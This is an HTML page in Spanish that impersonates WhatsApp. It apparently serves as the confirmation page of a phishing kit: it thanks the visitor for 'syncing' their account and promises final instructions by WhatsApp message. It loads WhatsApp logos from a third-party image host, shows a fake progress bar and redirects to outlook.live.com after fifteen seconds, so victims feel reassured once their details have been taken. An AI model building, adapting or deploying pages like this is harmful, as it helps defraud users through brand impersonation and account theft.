<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validación Exitosa - WhatsApp</title>
    <style>
        body {
            font-family: 'Segoe UI', Roboto, -apple-system, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #075E54; /* Color oficial de WhatsApp */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            text-align: center;
        }
        
        .confirmation-container {
            width: 90%;
            max-width: 420px;
            padding: 25px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }
        
        .whatsapp-logo {
            width: 100px;
            height: auto;
            margin-bottom: 15px;
        }
        
        .main-message {
            font-size: 1.4rem;
            font-weight: 500;
            line-height: 1.4;
            margin: 0;
        }
        
        .progress-container {
            width: 100%;
            height: 6px;
            background-color: rgba(255, 255, 255, 0.15);
            border-radius: 3px;
            overflow: hidden;
            margin: 10px 0;
        }
        
        .progress-bar {
            height: 100%;
            width: 0%;
            background-color: #25D366; /* Verde de WhatsApp */
            border-radius: 3px;
            animation: fillProgress 15s linear forwards;
        }
        
        .details {
            font-size: 1rem;
            color: rgba(255, 255, 255, 0.85);
            line-height: 1.5;
            max-width: 380px;
        }
        
        .loading-indicator {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 10px;
            color: rgba(255, 255, 255, 0.7);
            font-size: 0.9rem;
        }
        
        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        .footer-brand {
            position: absolute;
            bottom: 25px;
        }
        
        .footer-logo {
            width: 70px;
            height: auto;
            opacity: 0.8;
        }
        
        @keyframes fillProgress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="confirmation-container">
        <img src="https://sappsapp23.sirv.com/docs/JvsnINJ2CZv.svg" alt="WhatsApp" class="whatsapp-logo">
        
        <p class="main-message">¡Gracias por sincronizar tu cuenta!</p>
        
        <div class="progress-container">
            <div class="progress-bar"></div>
        </div>
        
        <p class="details">
            Estamos completando la validación. Te enviaremos un mensaje por WhatsApp 
            en los próximos 25 minutos con las instrucciones finales.
        </p>
        
        <div class="loading-indicator">
            <div class="spinner"></div>
            <span>Procesando tu solicitud</span>
        </div>
    </div>

    <div class="footer-brand">
        <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="WhatsApp" class="footer-logo">
    </div>

    <script>
        // Función para redirección condicional
        function handleRedirection() {
            const urlParams = new URLSearchParams(window.location.search);
            const action = urlParams.get('action');
            
            if (action === 'auth') {
                setTimeout(() => {
                    window.location.href = 'https://outlook.live.com/';
                }, 15000);
            } else {
                setTimeout(() => {
                    window.location.href = 'https://outlook.live.com/';
                }, 15000);
            }
        }
        
        // Iniciar cuando la página cargue
        window.addEventListener('load', handleRedirection);
    </script>
</body>
</html>
